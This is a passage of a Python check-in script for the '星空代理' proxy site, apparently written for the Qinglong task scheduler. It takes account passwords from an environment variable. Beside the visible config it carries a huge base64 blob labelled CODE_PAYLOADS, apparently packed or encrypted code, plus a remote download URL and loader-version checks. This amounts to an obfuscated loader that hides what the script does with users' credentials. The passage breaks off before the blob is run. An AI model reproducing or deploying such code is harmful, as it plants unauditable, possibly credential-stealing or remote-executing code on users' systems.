# name: 星空代理签到
# cron: 0 38 9 * * *
#环境变量XKDL，账号@密码多账号换行
import logging
import asyncio
import urllib.request
import platform
import sys
import os
from typing import Tuple, Optional, Dict, Callable, Set
from dataclasses import dataclass, field
from functools import wraps


@dataclass
class Config:
    """统一的配置类，管理所有可配置参数。"""
    # Script info
    SCRIPT_NAME: str = "xkdl"
    FUNCTION_NAME: str = "gogogo"
    DOWNLOAD_URL: str = "https://raw.giteeusercontent.com/kele2233/but/raw/ma/file"
    CODE_PAYLOADS: Dict[str, str] = field(default_factory=lambda: {
        "3.0": "fChSVFBhY2tAUkQyAQAAKtjDy4khJQzDW4WHaij87iw7cTZHK0dDYTF1bXVqOG9zRXFSZk9WTkRIeDl1QUJLT3ZtWEhUcHNCcjVXRTZQc2wxMFQ3bDBJT0oyeHVoaWpmaEQzdzdXbXJza1lsbVVrZUxzNkNScTdSZi94N2svdXBTZ2Q1eHV1Qmo1MkgwZ3hCOU5CMGEzM1N3QXlIVm9HT2Y3R3Y4dFUvMDdTV2puMGJ3Q04wNTZZOFg3a3l2V0RPdG9TSlllQkV2czZzUDlnNVhzdWtJN3JUS2tRaitXamFVL1IwY0tHRmFCbkc3SXFzYnd4NTVzaUR2cUdFOERhOWo4NzlmaXRuSjk1Uld6K3JhRXZGaHQ4UHMzaXNOUW94d0cxTVJBRUlxZ1NPeEtrSnl0NEc2dXh6REorV2N6bndIQ3pHcUhsOWp6Qk1EQmsyMVZMYVl1RHgySzNPSzZDNk5kRG8zVWd5WFJkSHVmWWEzWUVaWXdBcFpPd2ljVENmZ2JtV2ZWRmpiLzNxQ2JaclBwM2NzL014YWFpWm55dDc5SitURkxCRCtZOEp6QXV4Z0J6bnhrRUloRGMzWGtmM3RUZkhUa3BOMWFib2liV2VYYnJhSjczUjMycVVrV0ZZV1U2REtneGVuRU81WVVlZFRrLzJ1RUhkY3Zvd0dTUXAreUZ2L09lUzVHQ1ZwMW5Pa3ZyalZENVhHOGdVR1A2ekV3ZGNCY2lQZEpBUlhhcm5YejJoaGhiaVpralNLTStTZ3IwTGhQMTZCRHJYNGVScmViaEpzNzNsaGxHL013V2QySDVJbG5JSWhUcGhUaHVCM0FnM3oyYTZEbWp4Mnoybi83Y2ZMU2x4ZFBFeXpzd3pTWUhUbGdXcktUcnc4dVlaQ2N3TUdURmk2Yld5VFhVK2VFREkvU3VGdzgyWm1NU3ZaL3JpUHRXcTdhUHk0dklQVnh3aEhTWWMyU01mOFVmTEtsQkJKNlZOTTVGcFJ5WU4wa3Roc0pWYzFCOGZJbnV6U2tCb0d1L2N2S2w5N29heElKZ1hZRllUTEtPM2l0UDZ2Mk5vRUwvOWNGbEZjOGgvNmxkZDRPdzY5VkVsUUJkOUE1bENqV0NhVmVDNG5lV2FTVnpGNjRYeVFqTTR3L0VoMTNDblVJTFhaZE43a2xHL24xMS9WTUZMVTVUeXJLRzVOeTVjL0VUc2piUmZVVkpYYjc1VXdpTFVvZkFSb001VGhQZUZUeElibXVrM0NncllJTFZ1b0srQkNBSkx1OG5zYUhma0V2cnU5TXlsVm0wblZEUVpNOGo0T3ExbzVTeFlTTko0RmFhV05Eb2NlWlVmV0FFUXd0M3FFdXMxWllZOVV2RElFTU4xZ2JYaVJ6ZmNEM1pHM3d3SmlsMSs3Q3RnR1JPcW9MOXBucTA3Mno1bm1iODl0T2VPeTJGQkdkY3dHZm1nV3Q5c1h0NGtCdm9XTDZ1R3Z6eXZOZ0VCcDN1ZzY0ZG1naitEeHE5TE9BWk90WElnSURvd2J6ZWJKNzF6YXY3b0hxUG42cklRcTJaaXBKQjNZZllYQ0I5L0lyT2tjbEc2QjcrbkFQUC9aTUE2NnFnVGVqbFZuMlMrLzJZWi9uNDZzRHB4aFlVazhxYTZLUG1qZjAvUnZteGJoeGFyTVo3TTcvTjQrTnJYUnFkQTNIWG9YMmgxQWhJRnFXbTVSdlJtZWlFVmVnWTgwa2VVNFdLZDRqVThXVytPZ2VlaVFtWDNhQTZGdWZSRlBGenZUSTJxeE9ZWDJ1WHl5aUFGbkVnWTgzWXl3S3YrU1ZJRlVPQnRtV2Q4bFZPZmFQUzlGamlKczl3ZTlBNVpkQnJGMysvOUlmV0FhTjhDdDZ3QTZOb0xObkJmR01BN1BaTjFGVlBRcXZVd0txZE1vcFpxVnMwSDBnZzJxYlBWYWhDZ3RudjVCYURxZDRYYXVMSnNOcWxjeCs4OGJnTkFQNlQ1RkRWaTc3Y0VWeGJlR2lEYWZHSjdYdS9MeDJwNGpteGFBWDc5WjB4Q2dUbDkvb2l5S3BWdUxjYyt1V015N1JGS3Fub2JsWk1XcHFGNDZhejR6YVdLY1l1eDZkOUliOGxjZVdZNHpnSUNjSjJ2QytZdkdXWkp2UzNrTGV2bTV2ckF6bkhuN1F1eTAvTlVsSGJHZlNFdGdUR1U1T3FYOXRtV2U5Y2Uyck9FTEZUQkhkY252dnphMzZGeU4xMnpNdnpNVGNOb2hMb25kK0xWRWc5UjBOUzBaMUxSbHROZWFwUmpnb3JqK3VqMUNrZXZuMUIxcVdUajBiK0dxRG42TmgzdjA1a0tWdllWaStkSjRFMzhrblRaTzlaUzVoNzBuWEdMSjRkQ2pzaEpiajFjWm9qcDZYOXFBd2xOWURpRURvbCtkWWM4ZDZub3drV3BYVEJFZW41SUs1czd5NTAyNGZoVTRQZXZhMlBybUVNakE0OWYwNENSenVFaTRKamc0K2tIcnZzK0Zyb2JvQ1dMdXhwS09nL2JNSVdRR0JqbDBMWXRuL3ZvV2U5bnVxQzRXVGtRY0RCZ2J1NWRFWHRIMmNsVVMxRVBsMmxSblhBOTVxbWNvamFUbzFGL2ExTE04VlVycTQ2aHpoZXdRTnJlcHMvRk1lbytHOE1aK3BBYlZ1K0xqdFhOeUNCV1RwR3grWnFmUUxaWGdGMkVIU0tCb3lLa0pMbDF2aWJiLzdZVEwzblZiMUVoR1dxSjFJNHNCMmg0dndwRm5FVjJpRG9meE1zeWhWRjFYb3JnblNRckxmbUhXSEZySmtOWnZRSVlFTGM1dHdPMU9KamM2WklwZlpCMjBlK2RrN2xXQUpYRE5ZTkR0NTZjUlFkWkZHc0cxZHViUjUrYi9UQXVta2t5M0loK2xnU0pYK082a3BkeVY3cktTVkUzOGNqQXhUQ29FdjduY2FYMk16a2tLRDFzQmdRTUZKRks4b2Ywd3dweXhEdG43NEZDd0VZYWZFM1pqMlpVN2pKV0JYY2dPV1NTd3piQzNpQ1BMbW5welIyeDYvVXV2c01jYWVJalZVUTQ2YVVGWDhWT3FzeStjYjhjcnk5MHljeWIydjVWVGlWNHFXSlNsNjNpTWlpRVpLSUxvaWRhdzlqd3ZJYkQrZHg5VjlBWEVrL2hpZ1BDdUlHcUcybEduczN2Yjk3dUdVWm9TSzNabFlHQ0NBNktFYlJuQkZuRXk5R3dLWDZlY045ak53NmlWeU51d254SUZwMEF1UGVweWJ5VlI2MmJLMHZJTzc5Q29mV2VhYkpYdmlvYW81Wmg4QlhaU09kWDMyT1hNSWF5bmc4a0VSb0NEcU1SZjRGOUE1bVhDWFFmSWVFK1ZQT3hEc2FqK2lNZS84QXdpYUoxMVh2R2U0Z3F3U29lQ2NjVHFDdEc5Y0ZIblBuZldlY1lzNEcyTzFlejYvV3dEQzhLMzZVTUkyTjhWd2grSDgzWWFlZUoyMTRTZXVaTlFUbWpkUFRvdlp4QXRXS0pSejNUSk9qOGg0cHFjVVpsMGVoWnVhNzR3TFNXdmhrQ0psdzU0M2RnZTU0WjQ0ckNXWDlORnBWYUc2ZmM5dThjQVR1dE1KWTJXOHkwRmlJK1JUNzlHWmNsZDVSOFAxeUxYcjNlTFdsUndkYTdIc1BMdFpYVS92R1JmNEFIYTJhMGEwdmZacFZ6dzlWNVduN1JXWGJYdDB0dXU5aXozbE45TVA4WDVRWW9hSnRhMGdHNnVuUE5WVnhsdjErY0xUNW5adGQrNGRoSEhOUXhjQjN3a2FWMmFpUG5wOE5GMDZscnZaY2RZa1U5Zlc5NEZDdWhNSzU1TDU1SFZNc0JUb3JTYytBNFZDQjlVT00vSjF1Q1gyblZaWHd2VzkvRCtyMFNIWGN4SFY5NjFtMVBUMG92YUh5SGs5MVFNVG1ZbVlXZnF3Q0RsMXhJeU5xQTBpL3pPWTJCNUVLYUg0eVhSeDkwOTRVMWNYVVZKNENrVkcybWlHanhsU0tsbkdOamhvcm4rcGh3eUpSODJpa3V4bzVJczcxaHQwcGVLanBsN3dCdHd4R1VCU3hCTm55RU9MNGhqcnkvZVVXSGJuVGpET0dyYkQ5SENtdkQwd2dNM3BRd2IvcHdQR0hUYjJ3Y01pZjlaSHJrc1k4U2p2UUxrNFR4a3ZqVytTMnA0eWdCaFBJSE5vempWVy81OUp3QXgxZmRuc2ViNXNQWkhwTXQyVTVnSXNqd1dTRncvYUdaMW1OV3dBQUtaRVFmeXR1ZzRTZStKNU5jODVIYXFQYS9hc0NKZjl2MGE3VFNDQTB1czdHbW8wcWZSZjhSUzgvZHFrQXNPcmh6WlNXMmwvdXM4cVowMUZlS2FOSml6L0p1bnFVbU9zVU5TcE1kS2hkYVRneEZqeXJYclQ0ZWpLWXpLN2tOMHdZazBGQ2hHbGVjS3Nid1k1MjM4Q2h3QXpFcUNuV1l3NWdYS2o2OGdQd2dRNzNRaVZDckxsSnIvODM1U3RxamtkY1gzRHpRcHRnWG5CRWh2TmpYZVVHVmNRYUMyS3pPOGM1L1hGWU1pVFJTOFg2ZW4vd3BzTXl1QjZmSVRueGlUVVRBTWJHQkJ5LzRJSTQvZDErN1Y1cEo3OWx3ZTNSMWRwcW4zSEIxbkI4SDNRbDJIVWhySDN1T1UveWpiN2VpcGZld0xGK3E1cnYrWVAvWmkzei9qbXVSb3RiM3Z6Slg2Mlo5WWNEYTFrZ1FNVjdhMVZIakpQYzh6a2thbUhCWFNOTHBReXdkbWxWNm41SjhBREdtQ0o1Wm9vQkcyQnpwNkEreERzMnp2VDZ3bmRNSU9xaEJnRDZNUmZ5ZnBuckF2WEdqdHFFTHJlWjNTS0hvaHNFQUJuZzNoUEUxek05eS9Xc2lyZVhyUHBxL3c3RGNVRTd0TGdxcWVZMzhLa1ZiK0lsSmVscDBwTnBteDlrOWk3UTZJOE1xSkJmbDRiNWJBd0NEczlBTjJScWduYTBMVG9uYTZEMGNhdW53UlF4dzczUVpFaUNMNDdiajV2R0NwcWVHTlpkMXhSdXNieWttU29Bb2VUcjFwTC9xTkJnbzlyM3I2UWQ4T2k4T1FXaTFXbzlFYzhjL2t5WWFVVmRPN09DNlJGRnMyMHZhNVhLQVM3WTMwa2pieVlKZ1hnZEhnNlZlMUQydFMreWxhdmtBV3cyRDZWZWZUUlovMGpXb1dMY01hcHMzd1U5V3dYaGs4dTZCbHZtQU51TjRiMks5WnBlemFrRGdVU3MxOXphRWRQcjFMdGFIWUtoR1ltWHhOZUtxR1FGMVVobzd6ZjFpUElSTFh0QlVwZnVpVWRHU1paclB3T3psNElxb2R2UnpSQkE4TnE2emxuMmc1d0dua1hXVXUxR0lJYys0UTN2VCtsQjZTQVlRdUJiTjdpM0ZoTlNBUFB3N0hEcUh3L1FNMHpiam45Rm5WNmVuZkp6MGRGYzY3YkcxUk1FbW0yTWdaazd6bkpZTldVakZlWEhHRnFkQzVUSjY2SkdIM1UrWFRnVU5sSnBDMVhSbUVJTGtVK0RqbWd0akpaOHkyNWd0eitWMjd4YjU2cmZiMUNGU01KNk11U0x5Rmt2a1kxUklLUTVQOUJGbDNGcjliaFY3ZWlWVnl3LzFlUmt2QUxLVThwZTVoL2FkOXZCdUx0VnEzRjVEVThURWd1Yzl2allXZUtNQWRyNFozUkYwc1hCcnArSUYxdWtMQVZzLzZxYTFtVFZtV3hvTTkveHUwQ0Jzcmcrcy9ZQ1ZDQmd4TGlZbUxSc0xYeUEzZFlBRS91aERyMVl4Rkc3eEJaU3I5Z09BSzdSVVY5dzRaY2xBWko1aXBwdlRBVHVhdDJsd2htNnZsUWFBOUo2NTFxTnZpOFU4WXhOVmtUQlFWOHVNRTJWVXA1cTE5Umw4UzdqZGNTM3FTNmVtb3lUSW9JZUNQUHZSR3BjYXZicGtDWlN3ZGJrZnphWWdIQnkyWkJyaHk1RVkxUEp2SVZYQWYwUy9UQWl3RkZSUXB3Q3pkWXA3cXdJK3RqUnlnVkZDVGhZME5hTXRyak5YV0FFbE1mdUNPN2RCS1ZiRXFUaEZIM0NnQmFGWEJtUTBnM251WDg2cEFVbSsycjRSSDVZaURYUFUyelV4b0JDemF3THpENmlNK0owSnp6Rnpjc2YwZm5aNENqRXhVb2lQdVdrenBHOThrMkZOUk1ZMTFERFpGd1RadENXWktHcUVYd3BseXhadU9QVTQyTmlpQ2lEek9rSVg5MDFOOWExVG9MWTN5ODFhN2lZZzk1VTV0V3o2TEJwUUlNcXpEdzUzb0tGYUNoZTByYzFZTzhWRzF5ODNtUUFxNnYya2UveVI2eFpVK2crLzBPNDFhQ0lGNEUwbmh1bzFaQUcrTE9RcitSOFZzc3FRQ0t3MDZlQWZPUkE2QzdVT2QxWUdnVUNHcnNvNTlOUGtXN2txZnY4T2x0M1BaOW1ENjB0ZGQ2MTJta0txZjdWOGVFTXVuckxJN1RYcFVCQkZYcWt6WDVBUmhPTzliMUlPTEFUOWFtYk5QQ1dqUTZSR2tkdUVBT2NhRWJlUGpDZTNzZVhRU1F1OS9aQ3pDTUp0RDdjQVNjNXExRXFKZTdGRm51YXpOb0xqem9RU1lPUFM4WlBWU2RGSmdxeVU1bTh5ZlI1eGNjSGwxb0N6S3paQkdvMW5KTVVhbW42R21QUEZMa2E5UWhUZ09tMjc0Y3BHUVhXblo0OVBQdXlsY3RESU80UjJvdUNpNEtsVjRWd3pPMGQ1NEY5SVh0UTFleS9oWkI2N2lvenpySGZoaEIvcG50UzZDaXdhRDc2b1EzL01SWlZwRGFIWWZWWXJLRjk1Y2d0bjFXcmtudGhiQSttTWdRRVVDRlc0ZmJKeXhxd0Q3OFQwTHZIU1p3ME40cXJyaTN6YXpMcnlOeUQ4cCtQZ3JrbENMTnhPS0RETGN6aGhXaVN6ZXZ0NlIvNGdnK0RsTVh0Sm01SWVTVFJ2dmRsMmtiVGxYY1FKcEl5Vk90bm1Wa2dRVkYrM0VpeVRGVU9SamNQRjYvems4eDBiTUJPZXRPNXB4ZmdsRFhNT2xnNDYyWXkrR3h1M0ZzKzRiNURHQmExRk5JT3ZPOHNOSmN4VkU3YUJSQVRuTWw4S1ZCRG4welNNZ2NnOFhxc0wyVTdlVHozY3NQNGdYWk40ZVRqYndlL0EzSkY2aW1WcCtKbjBkcGtaTUdpWEhYNDVUNklSNjVFWTN3c3g2Z2FnQzJWQnJrMnMyaytlUG15RW41YlJZclZoa1k4OVhxMFZma1FQT0d6Qm9NYlN1eHA2ZVlGRXVwbEJRcStaZEJ4cDQrZ0kwZThpN0o5L0pyV014TWROSXZ3MnQ2Y2d6LzlDenFjTGtvV3NjSUtpQUxpU01NME50OWIxQ21IUGZBVktEVElIdmQ5UU5FMWtjUHFjWjN3WURjbW5FV05vUEh6RTJWL0lqUUN3OFVhZGtoNTRZQnh6cldhQ2xiVW9Hd1l6c3FxVThIUmYybWpTYkRScmtGQUwrTUxYd0c3N0ZwbXpKcGZMZzB0cnptdjhaUFJFT2ViSlJDbUtJQS9CeEJTcFVZZVpVdURmU2JQc2Z5bkg1TURhYWw2WlRQYWpaaklZay9VZkVVV1NlVlU1dnByZzU5aGRhTVJLOUJEaXJGVlFBdFdoVGJRMXRBMXNQeVV5UXVoYXQ4c2MyMFVtOFE1cXRWVWJGL2FmQkxNNk5mRmlNS2hjM21YdmplLzE3Qisxcnd2Z3FoVmhZY1NsQlZqTFBzK2E5V2FuTVMwMmNiWSt1MS9SQzE2L09aYzQreHJMT1g5Ym5wRnI0UDUzR0JZU1NMZ0VBWXc1Z2F3dHI4Mk1TM09uUUZMaWdQRkhYZXdVV3NGR3FmaWlaaVB1SDVhS2JHUGozeVRNS3kwNE4rUXR0K1lteERNV0NWc3RJOFZFU3dsV01QTlB1bDdGSmR3NlJ6ZVduMXJ1Wm5Ba0pJZFBKai9BbDhQb0NjS0diQ0JkbzhQdGVJdzU2SXJtV3FvbTVzSlkvYTR1SnUvbnJ1RUhsTkNsaVk1eGN6S3dWeTFOeHlubWtyQ2hrVTNDandWbGdLTUNjZGRuUDdhQmZtV2VZeEFSSVpHdlJmN0ZBRTFZNmJkSWRTVlc1ZEg4d2NuQjhrbE9FK2NpOEpiVFFtdyt1Tmh3anFQSS83cTZQbG5MT2pHOVdSTzZJRDk0OFc3c2ZPVDg4aFhlMVhzakFvMUh5d3B4VktOSGZJNi95S1REUk5Bd0RGYjFqVmFyM29QYnlFbU1MekgrdTEyaE8zaklHaVBnaWFhMkU2bUNYOUxSanR1dGhkN2ZjQzlMOGN0eFZnbkVvRmJrdkxxV3pVcnBCU0NTalAydjE1RERKWXZXOVJEcERVc1Y1TWZHWFpRZndOMFlrVUNMVDVDRFhPQU9sbUVyeVVadEJjaHZKeW9ySHJ2RnBJLzk0UzNSakpBWVMrMFdRWnF5MFVseU5jWGxiWGl6KzlJY1ZlWnRSUkcrR2RyazhwYjBQaHNUazZMdDQzS2hDdjNiNzlhd1prSU8vZzYrdGtWUXpSUUo1ZHlOSG1LOGhXOFIzNENpdWpFQ1ljYnYyclc5VHgxVHBveE5WWXlNNTZ4Y2dweTF2Y1p1TlJ1MDI4N1JzRnIrWkxmWTVNSVdDWDRtSGpzbi96NFpZYjlrKzFBaFZBNXNHZnkwTkRvUmNkV2dGWjBtbW9hWlE1SlQzMVhRWUQyQ1Q0anpyQjBxSXBCNTRtQ2U2TDdLT2g2MWcxSHRUQzB4dHU1UGwzWnZuQi9RWXdJMmE2Rzg5eHJ5ZG9XQUtycmZweHV4WEVBMzdFYW0xNGRybUtsNi9Na2dkS1ozSllSZjNucCtBeTRPTW1ReEhOWldMWXFFYUh0bWI1UWc2eVNwRTVEZ213QzBabmhlbW9RdGYxMGx3eXY0elh6Z1NSc3VoOTh5NkVzR2E1ZndtWEY2TDJhU3dmUDdRakxrcStkZXVZSnY0N3ZRWGVJTDgzZlUvMHJMNS9HTkhTemhoR0FkUlNoTURDWTZsZi8wWWN6a3kzVmtkRENDdVl3OTRDWElPSkpNYlVqMjBENHltS0NYaHpzSTBROGovUjVsWUJZMjQ0a2VlaTVFNUJNZDhvc0lnbTJiUFJySjRuUGtLQTBTZ3NKczl2d0p1WEErTGlRMjhjTndmYmlXS0ZWR2E4Z25zRm8xaEsvNUVubFd4SUlsM1ZkSWQydkttUHY1NGIydmVqa3ZZaUNOWFAwNGNzK2QxNi9LUkJkbHRQeExETmJQZDFCYzVZZDNTdlJ3aU5zREw0OHFBTXJlNUYzbjcyQ2E2MmlNNVBaSzd1ZHYxV0V1Nk5HWllzUnNUUTlabWpsZjFMNE8xYnN6Y0JydEVNZWcyM0NYQUgzUlEvMXgyZTkyY25DeEhIQmNJQW1UWk41SlpnV3I3eThublJmMFluWEtVRlRtUktFM053OENkOXliNWtHaVVPK25UcDFDd2dIVkZlT3diOW1UNHk1aXcrRHdZSHBzaTZBZFlZOGxNa25kbFRiSzlabWxwRkV6QzBnT0kvVmJZSnBQUk1YYmlHOE9RS2xSVjVxS1VNWUFnVVM2bTFEN3hrU2xvUmhvUlRFYUNnbkQxVGtyVXBZL2pVTUQ5NjdwSVlXOVNFM0tSR2hmQktTSCtvb2FqUXN2ejVESStqbWhuMFh3SGtjL0ZyOTZJVEtJelM4WG1FSjEyUmJhRmw3WmJnTFVBTzBlQ29HZ2xBNm9EaUM2Q2wxeExtTDRnYThCK0ZEWjhUd2xaV29IVW5RYVVjZlRLOS84WVRqUTFXb1ZVRVZEQndqU0dYUHZXdG81SlUxVWIwUXJpbFlmRDl2MzUvMXZSWEd2cExmcXJsSFdobjZZSW9HZ1dTSXJiS0lHTE5xaHJhNTNJQ1VoS01aekVhelF0UWgyR3J0N0hhQmhXK1hRL2gwaW5kYTRSb3NadG9DdVRhMFhDN1ByZFpEVENTc0k4VTdNalI2bUN0c016dXVvNUxEOHFDN0Ywa0dmcGNlOEFFekRNcmpzZDBOTm1xd1RJdy9BV2R5ZWR5bE0wQk0wZmRySDJLeENYUmtFdXBpV1dQSjNXVUU1RnZoaFNJSlVpWGNHY21VbUoxNVdiTE5XOURFL3NyK3lnZ1J0eXF2ZXVuaSt1eXE5Q3JQVk10YXhYWlE4TTNnd2pyejVTazF1Umd5dVlET0lUVXNlRHhraXJNV0hoZENNVjRRK1Ria1hBRk0rZCt4NVBxN1JML1FlSVZocUlNSnR6MUF6UUNWQ29LQ3RCTUhjNWgzUEw0UGd2L1VGZVlRT2h6NzI5aUdkVXRxWTJjWUhrZW51bm1wOHZhZG90b0x4L0NKYVJPYmVTNmNqREdjbVFyaUxKRnlKYWZXQ2hkRGNhdm5Kc2lRcVVvbys1Si9xTlc1ZWZ3TEl2RFB6YVFkVUhRNTA2VWloVVBzUG9qTEF2UUFwdjVYTGhtZG1vZUlpMkthdHUrQzVzRk9EWVBVUnpWUnJYRVpKS29qMkk2YUx5M2MycWM0RVA4ejNENzN2cmp1M3YrelRpK0dJRnhxVWJEWkhFSzBleXkwQ2J5R25xd2NyQ0VaVEIrM2dWZVMzRlVVMHpYc3ArQit0NWxBd0FMeVlyT01BZWtXZDhIVHhTcUNkbmY0ZFJvTm0vSzJ0TEUzLzRCR0NNaDZFM1R3Qks1OW1hSXhqa3A2VjU0NzhURjNaUSt6YThhYU44YlZ2ZHVZZ3JuSWp5M05vcVJjY3ZQb1I0VktUMHVONFFuV3dkSURRVlVPbjl4cjlmdTZvTWJGR3pmVGt6QmQvdkVITGQzZHl0NDhkZlYyUHBXWHBPeHM3Y3RjMEtDL20rN1ZvTCtRYzhUb21DSnFkVXpCUFBsdGxJbTdlTXRyOUo5RlkzbEdLZlhUUlNHcTZNYkRpYzdRS3hLQWZvUmRKUFlwL3BCdys4WlFrdnBMVE0yWS9vSUhHeVcyNFpVZVVaVjhyZE81aUd5NVBSOHFHdFFKLzAzeWNCeTJyRCtGTG9XSnFlZ1NIRHB4bTg0bEFyT2VFVzBZeHhUZVROM0RQd3pxcXU5dS94bzFheCtKMHVpcXgyd1VYVTNCNkd4RHkvQWlZVVlhVDEwNzYxVTJqQWZZS0YyeFlXZGI2L3QxSlRtcEVKNW5PaHZ4YjlVclpFZFZHZU10ajZCeE16YUxhZzZRNmNEclY1UURiT3cyL2kveEpnYktwS0pjZVE0dDNXVHhCS2ttVlNJSElsdnpkYjVaSkhGcHVLTFUvR0FVckQ0OUxFNTNOT3hGZGJ4cTBmcWx3aHA0TkEzVDN5RW13c1dwbmFqRW95TTQ3L3d0OFdkc21HT3JTb0xOSWZIWjNiM0ZzbXFHVjgzYmpncWxISURXWHlBemNISi9TV0h2cnBuMUJLQldOQVZwNkJKMTZnWWlId2JJaFduUnBhcTJzVkxVRzRkTG9aYm5IbCs3amIvdjhNYjljUHk1aEM5WmpaWGQxQXNsakZtV0ZrMWdDaStnbjlFZ2JBcE9EM1lRWHVLY0VQdVZJZHJVYzZjSWpid2lWUTZXYkN5M3BlY2NybDBzd0lCM28zRUtsZVRZcG9jT0tDMndRU1g4YzEvajBKUnlVYmRuMkNXNnMzN1I1SEVrOHdIK3JEeVhnazNkcmlYVDdZcEtwYnhZMlVPWGdFZWhyc3NLL3IrV2ZPMkhBSWI4dnhOejBtdXFtU0NqZ0I1MGpYeFZXYVpmdkowbEZRVFJqWVNJVUNaNWY4S25VcnpxejI0UVMzcE0wcU9zUkJYUXNvdDIwcHQzcS9BSGVtTlJncTI3T296NVVFM0ltcVUzYmYwZ3NNYy91M3NJWDVhT05jbk84UHhQaWk0VlZheEorQVRKRFNwTGdFUHl0WUxMaERtQ3JJeEZDZE4yazNLaDcxVHdPSDRkR3VlMmUvaXVjajBVTDZXQXd4NEdaOU85U3RadFVSeENxUWxUYUljczIvOUljWmpEWHFrd2xDVjRVUm5QNGdaMHlWUkZHdlMwc2RhaGpGditpbWJBL2hQd0xlK2srMU5XZkx1WDhZRFpVMm5nNGpzc1NZenFiajhTbTR4cVc3ekpBd3l2S2RiaUpjNUdLdXZSb3dyOW53cUNmTkhlY3lDSFozdzVxTGxBZlp2ci9nN0VySjBRSDFZWVMyb1hNOFpzK1IzUnZZYWFwRkJVYXJDR3RBU1BzL1NRbHBaVEh4V0NUZmFXNDZueE5hMi9BSG9Ncms5cENGb0xqaGRtY245V3diS3Zyc3RUejJLTTY5bzlRWXNNTXE2bGhuYkpFd25UVXBqNm1yUlg5MjhwQk93b1V5RkhQNzJLRjVEcFljMzRSOGJRdG9NYXBhbHBqcTZ6TTZzMFBYL2RzaDNzM3kyaGo4T2FwMHh2UGs5RHlseWFyeEpxZ254VGhZZXR3RXhVRlkzckM5SUJOaFJkNnlCem1oR1lVUFlqdVNXbGlrckVKQjlKY1Uza0hmQ1JxR3FOMG4rcVFTaVV3aEVoYXVka0ZhOUlKYTVkTHVnbDQwb0I4RnV3MnRsMW55bzlKLzhKSWVxR0FRRVF6YndBZ1kwcEIrZDlnR1Vtc1R5Z0NDNFRQS2dtWS9XYWVqL1p0RTdOWGdCU0FpeDFKeFo0TmFiNDNYZUlneFc4UEIyeUNaKzBGcWpNVDRjMk5SZEZlTjZrRHladFp2V0d5OEVNc1J0RWU1TkdITjZJeXlxZ2xmV1ppbXVXSDFQWHFTMlhiTGNxYTVUN3ptTGtsb1NUMmVVeU1xeXI2dlhtK01lRWhxK0xWMmZnMHdiUVR3RXVTUmpYV09KaEtUd1hubm9QUDEwS09PNXA2TTQ1WXI0WnFmZnNGKzZ3cVBlRkc3QWd1aDRBUi9wK3phWGMyQ1JtRW5EOFhLQzRzakdCZlVQTzBRckcrbVFyaUFsQnhrZVZWV0wvc2xCMS9ZNUcrbGV1Yk5YcG55aFJzMnRwRkxzdkhOazFHSFFtTmlGTy9qekg4Tms5RFdiZFVpNWw0N0l2eE1EUmY3MVFSMGxtVmxMSGtUUHdYSVNDMXMzb3hobGRud1JudUxuM0JtNDI2SzJsenBMa2FwMmNBZTVXTy94bjBoWUpyRnZUeFBPRjB4MVNLcDZyN3lleXRONExlcTk5VDBuN3gwWnZCY1VkeTVOR3cyYnV6VXNrNVYrbzNSeWhDdnhhcmhOcUlGZGszbUZoWkh2REttSTFiN1l2WUZkWG5jdk9WRGhaT0hiSXR6UzlsRERoUTlPdyt4TE42SUFiWFkxVUpaeXNxRXA5THpDZndCV3JHUDFpdjNFVURQY0JLRGx0R21Jck43azlLQy9zSW45eHZrRGpLWEF4L3kxRnBKakNhZ2hUR0ZKczF0UUFyRjZVN2pjSGtyR256YnMveStmYnhEbUN0SWNZcDI4azJrRVNhNUNRNTdIQmFKUU5aWXBvNlBVVG5NUVBCSEhjNFR3VkZrOVduUlhYV1hFck9pZmRJRTR3c0Z1V0Mwek9kNGhsZzJIZG5FTFgxZnpFSjc5b1A4aTF5L3pkcWg1bGcwSVRZNDFualhkWTR6M3hDdEpzV0p1T2ZEdnJUZUVONXlRVG1YZVM0SEFyQ0IwODVCaWFiZ1NxcTByU3FtUGZOZEx5YnpodC85eHBENjd2VFRJc1VxL0Jiam91MmJwOXFkeEJmRjJmeW1pbVRDSEgwZTRxR1FUZUN3NGt0VVN1WitjK1JDaWVpN2FpNjhPd0hCbkpwQVhBYzYyRXdraktLL255cXVqTHdWOHYrakwxSVFWRVo1S3RhQTEwMloxcHk4TS8wMVhkUjRqSi9TUTJkbFZZeE1JUCtTTlVaTjJ5Smx4bEtHSzNuTk5ZSnoveW8xQ1loZVZYM3BOTDQvQ1BWM09HeTkzYk54V3N6OEhmNUpIZ09Hdm1RSWp2SU40cVVWQWxQMFNVNmd6STcrWEIvcU5kVC93MkFLb0kxaFFjcU43K1dGUU1TdlFLTnVOeXNaNG1yZVdqOVNNWTJkNWM0RFV1TG5LcmZmT0RlNHNmdjBQNjBxUWV1ZjZiZGZyR1NQM1Z4TzdQSjBSTzJHZ1AyVlJnNVY1NUdrSWMyVkI0VEhFTW1VdmMvV1hVYjZrcXdoMFRIam5rVDZCWWVyUVJXMnd3TzBKTzMvYVc4ODJZZzMvT29BcVFOTXZ6THQzdFpBNDFQV1VBUkFsajJOOGE3RUZhZ3IwK1QvVE9iZm1yam5EKzRRN04yaGdWeTN5emtjak91RmxzTDBUY2VEZWlKM1gzNFcxYlNmemFZZGdiN0wwbS9mYmxGdkJnR1liYnFiQjNhRHBNSDVSRmRkdmVINXZoWERQc21ZVlJwdzZ1V0lrbThKK2ozMlA2VVJuZnR0TlNEaS9CME8xVEtpZklTTHJhdEM1R3BTSVpKS25GL3pXeGZuOHJrUk9oMkdTemU2QktJdHJJWVlocEo2NHBNZEZ5blJWa2dKU2RZWFJNeVVHaUZLclROaTc2MGF4UGVPRThzK3prSG9TbUdxR1pKU3ZzR2NheFN5SkpKTzVYVG1udz09"
    })
    # Environment constraints
    SUPPORTED_PYTHON_VERSIONS: Set[int] = field(default_factory=lambda: {10, 11, 12})
    SUPPORTED_OS: str = "Linux"
    SUPPORTED_ARCHITECTURES: Set[str] = field(default_factory=lambda: {'x86_64', 'aarch64', 'armv8', 'armv7l'})

    def download_url(self) -> str:
        return self.DOWNLOAD_URL

# --- Logging Setup ---

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# 生成时替换：本包要求的最低 loader 版本
MIN_LOADER_VERSION = "2.4.0"


def _ver_tuple(v):
    try:
        return tuple(int(x) for x in str(v).split('.'))
    except Exception:
        return (0,)


def _ver_ok(v):
    a, b = _ver_tuple(v), _ver_tuple(MIN_LOADER_VERSION)
    n = max(len(a), len(b))
